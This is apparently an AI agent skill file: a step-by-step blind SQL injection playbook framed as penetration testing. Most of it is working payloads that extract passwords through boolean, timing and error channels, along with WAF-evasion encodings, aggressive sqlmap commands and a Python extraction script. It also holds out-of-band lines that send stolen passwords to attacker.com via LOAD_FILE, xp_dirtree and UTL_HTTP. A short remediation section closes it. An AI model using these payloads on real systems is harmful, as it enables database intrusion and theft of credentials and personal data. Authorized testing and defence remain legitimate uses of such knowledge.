---
name: blindsqli
description: Detect and exploit blind SQL injection using boolean-based binary search, time-based inference, error side-channels, and out-of-band DNS exfiltration, with WAF-aware encoding, sqlmap automation, and custom extraction scripts for authorization bypass and data theft scenarios.
---

# Blind SQL Injection

Blind SQL injection arises when injected SQL executes but its output is not reflected in the response, forcing extraction through boolean differentials, timing delays, error side-channels, or out-of-band callbacks. This skill covers the full extraction workflow: injection-point discovery, boolean binary search, time-based inference, error and OOB channels, WAF-aware encoding, automation, and hardening.

## When to use this skill

- A parameter reflects no SQL error text and no query output, yet the application behavior changes with injected logic (`' AND 1=1` vs `' AND 1=2`).
- Search filters, sort parameters, cookie values, JSON/XML body fields, or HTTP headers are passed into server-side queries.
- Error-based and UNION techniques are blocked or suppressed, leaving only inferential channels.
- Rate limiting or WAFs require low-and-slow or encoded payload strategies.
- Post-exploitation scenarios where credential or PII extraction must proceed character-by-character.

## Methodology

### 1. Injection Point Discovery & Boolean Baseline

Probe every input with paired truthy/falsy payloads and diff the responses:

```sql
' AND 1=1-- -
' AND 1=2-- -
```

A stable differential (different status code, body length, or content) confirms executable injection. Establish the baseline with three clean requests per candidate before extraction — the noise floor determines the minimum detectable differential. Test JSON/XML injection points explicitly: `{"id":"1' AND 1=1-- -"}` and XML attribute/element values often bypass filters tuned for URL parameters.

### 2. Boolean-Based Binary Search

Extract data character-by-character with exact payload patterns and per-char ASCII range narrowing:

```sql
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -
```

Narrow each character with a binary search over the ASCII range (32–126) rather than linear probing — 7 requests per character instead of ~95:

```sql
' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))>64-- -
' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))>96-- -
```

Enumerate schema first: `database()`, `information_schema.tables`, `information_schema.columns` — the same binary-search pattern applies to any scalar subquery.

### 3. Time-Based Inferential Testing

When boolean differentials are completely normalized by application caching or static templates, inject time-delay commands to force synchronous engine sleeps.

Engine-specific sleep primitives:

```sql
-- MySQL / MariaDB
' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -
-- PostgreSQL
' AND 1=(SELECT 1 FROM pg_sleep(5))-- -
-- MSSQL
'; WAITFOR DELAY '0:0:5'-- -
-- Oracle
' AND 1=dbms_pipe.receive_message(('a'), 5)-- -
```

Conditional time-delay exfiltration extracts credentials character-by-character:

```sql
-- MySQL
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)-- -
-- PostgreSQL
' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='admin')-- -
-- MSSQL
'; IF (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') = 97 WAITFOR DELAY '0:0:5'-- -
```

Maintain a statistical baseline: average three clean requests per character to compute the noise floor, then classify a response as a hit only when its latency exceeds baseline + 3 standard deviations. Run 2–3 confirmations per hit to eliminate network jitter false positives.

### 4. Error-Based Side-Channels

Trigger exception side-channels that leak data in error messages even when output is suppressed:

```sql
-- MySQL: extractvalue/updatexml XPATH error carries the subquery result
' AND (SELECT EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()))))-- -
-- PostgreSQL: cast errors leak values
' AND 1=(SELECT CAST((SELECT current_user) AS int))-- -
-- MSSQL: conversion errors
' AND 1=CONVERT(int, (SELECT DB_NAME()))-- -
```

Conditional error triggers force an error only when a condition holds, converting any error-capable sink into a boolean oracle:

```sql
' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE load_file('\\\\nonexist\\a') END)-- -
```

### 5. Out-of-Band (OAST) / DNS Exfiltration

When outbound network access is permitted from the database server, trigger DNS resolutions or SMB/HTTP callbacks to exfiltrate data in a single request:

```sql
-- MySQL on Windows: DNS exfil via UNC path
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password), '.attacker.com\\a'));
-- MSSQL: xp_dirtree / xp_subdirs force SMB callback
EXEC master..xp_dirtree '\\attacker.com\a';
-- Oracle: HTTP callback via UTL_HTTP / DNS via UTL_INADDR
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1)) FROM dual;
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM=1)||'.attacker.com') FROM dual;
```

Encode exfiltrated values with `HEX()`/`RAWTOHEX()` first — raw credentials containing invalid DNS characters break the callback. Run a listener (`responder`, `interactsh`, or a wildcard-DNS server) and correlate subdomain labels back to data.

### 6. WAF-Aware Character Encoding

Bypass signature-based filters with arithmetic and encoding primitives:

```sql
-- char() arithmetic instead of literals
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=CHAR(97)-- -
-- ORD() / hex() to avoid quote characters
' AND ORD(MID((SELECT password FROM users LIMIT 1),1,1))=97-- -
' AND (SELECT HEX(SUBSTRING(password,1,1)) FROM users LIMIT 1)=61-- -
-- whitespace/comment substitution
'/**/AND/**/1=1-- -
-- URL double-encoding and case variation at the transport layer
%2527%2520AND%25201%253D1
```

Rotate between `SUBSTRING`/`SUBSTR`/`MID`, `ASCII`/`ORD`/`CODEPOINT`, and `CONCAT`/`||` per engine to evade per-function signatures.

### 7. Migration to UNION When Column Count Is Discoverable

Determine the column count with `ORDER BY` inference (`' ORDER BY 5-- -` succeeds, `' ORDER BY 6-- -` errors), then migrate from blind to UNION extraction for one-shot reads:

```sql
' UNION SELECT NULL,NULL,NULL,database(),user()-- -
```

UNION converts thousands of blind requests into a handful of direct reads whenever the response renders any column — always test for this escalation before committing to binary search.

### 8. Automation

sqlmap handles boolean and time-based extraction with parallel threads:

```bash
sqlmap -u "https://target/search?q=1" -p q --technique=B --threads 10 --count --dbms=mysql --level=5 --risk=3 --batch
sqlmap -u "https://target/search?q=1" -p q --technique=T --time-sec=4 --threads 5 --batch
```

Custom binary-search script template for fine-grained control:

```python
import requests, time, string

URL = "https://target/search"
CHARS = string.ascii_letters + string.digits + "_@.-"
extracted = ""
pos = 1
while True:
    found = False
    for char in CHARS:
        payload = f"' AND (SELECT SUBSTRING(username,{pos},1) FROM users LIMIT 1)='{char}'-- -"
        t0 = time.time()
        r = requests.get(URL, params={"q": payload}, timeout=10)
        if len(r.text) != baseline_len:
            extracted += char
            print(f"[+] Discovered ({pos}): {extracted}")
            found = True
            break
    if not found:
        break
    pos += 1
print(f"[*] Final extracted secret: {extracted}")
```

### 9. Race Conditions in Rate-Limited Extraction

When rate limiting throttles sequential requests, parallelize the binary search: split the ASCII range across concurrent workers (one thread per range segment), each resolving one bit-position independently. Alternatively, batch multiple character probes into a single request using conditional aggregation (`' AND (SELECT SUM(CASE WHEN SUBSTRING(password,1,1)='a' THEN 1 ELSE 0 END)...)`), reducing request count per character. Time-based extraction tolerates parallelism poorly — serialize those probes and rely on the statistical baseline.

## Tooling

- **sqlmap** — automated boolean/time/error/OOB extraction with `--technique`, `--threads`, and `--count` controls.
- **Burp Intruder / Turbo Intruder** — high-throughput payload fuzzing and parallelized binary-search execution.
- **interactsh / responder** — OOB callback listeners for DNS and SMB exfiltration correlation.
- **Custom Python (requests)** — bespoke binary-search and timing-baseline scripts for edge cases sqlmap misses.
- **Wireshark / tcpdump** — verifying outbound DNS/SMB callbacks actually leave the database host.

## Verification & Deliverables

1. **PoC:** For each injection point, the paired truthy/falsy request pair, the extracted value with its request count, and (for time-based) the latency table contrasting baseline vs payload responses.
2. **Impact:** Data classes reachable (credentials, PII, payment data), DBA privileges obtainable (`--os-shell`, `xp_cmdshell`), and whether OOB egress enables one-shot exfiltration.
3. **Remediation:**
   - **Mandatory prepared statements** — parameter binding libraries (PDO in PHP, `PreparedStatement` in Java, Prisma/TypeORM in Node.js, `psycopg2` params in Python); never string-concatenate SQL.
   - **Egress filtering** — block outbound ports 53 (DNS to unauthorized nameservers), 445 (SMB), 80/443, and 139 on database hosts to neutralize OAST exfiltration.
   - **Database privilege reduction** — strip `EXECUTE` rights on administrative packages (`xp_dirtree`, `UTL_HTTP`, `pg_sleep`, `LOAD_FILE`); suppress verbose driver errors in production.

**Deliverables**

- Findings table: injection point, technique (B/T/E/O), extraction time, data classes reached, severity.
- PoC scripts: boolean binary-search extractor, timing-baseline harness, and OOB callback correlation scripts.
- Remediation matrix: parameterized-query coverage per endpoint, egress rules applied, and error-suppression verification.
